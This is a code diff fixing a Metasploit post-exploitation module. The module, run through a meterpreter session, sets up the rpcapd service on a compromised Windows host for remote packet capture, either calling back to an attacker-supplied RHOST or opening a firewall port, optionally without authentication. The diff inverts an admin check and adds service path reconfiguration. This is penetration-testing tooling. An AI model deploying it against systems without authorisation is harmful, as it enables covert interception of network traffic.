@@ -27,7 +27,7 @@ class MetasploitModule < Msf::Post
         'SessionTypes' => [ 'meterpreter' ],
         'Notes' => {
           'Stability' => [CRASH_SAFE],
-          'SideEffects' => [],
+          'SideEffects' => [CONFIG_CHANGES],
           'Reliability' => []
         }
       )
@@ -44,7 +44,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    if is_admin?
+    unless is_admin?
       print_error("You don't have enough privileges. Try getsystem.")
       return
     end
@@ -60,7 +60,7 @@ class MetasploitModule < Msf::Post
     print_status("Rpcap service found: #{serv[:display]}")
 
     start_type = serv[:starttype]
-    prog = get_env('ProgramFiles') << '\\winpcap\\rpcapd.exe'
+    prog = "#{get_env('ProgramFiles')}\\winpcap\\rpcapd.exe"
     if start_type != START_TYPE_AUTO
       print_status("Setting rpcapd as 'auto' service")
       service_change_startup('rpcapd', START_TYPE_AUTO)
@@ -71,12 +71,12 @@ class MetasploitModule < Msf::Post
         print_error('RHOST is not set ')
         return
       end
-      p = prog << " -d -a #{datastore['RHOST']},#{datastore['PORT']} -v "
+      p = "\"#{prog}\" -d -a #{datastore['RHOST']},#{datastore['PORT']} -v "
       print_status("Installing rpcap in ACTIVE mode (remote port: #{datastore['PORT']})")
     else
       fw_enable(prog)
       print_status("Installing rpcap in PASSIVE mode (local port: #{datastore['PORT']}) ")
-      p = prog << " -d -p #{datastore['PORT']} "
+      p = "\"#{prog}\" -d -p #{datastore['PORT']} "
     end
 
     if datastore['NULLAUTH']
@@ -88,6 +88,12 @@ class MetasploitModule < Msf::Post
 
   def run_rpcapd(cmdline)
     service_name = 'rpcapd'
+
+    unless service_change_config(service_name, { path: cmdline }) == Windows::Error::SUCCESS
+      print_error('There was an error configuring rpcapd.exe.')
+      return
+    end
+
     if service_restart(service_name)
       print_good("Rpcapd started successfully: #{cmdline}")
     else
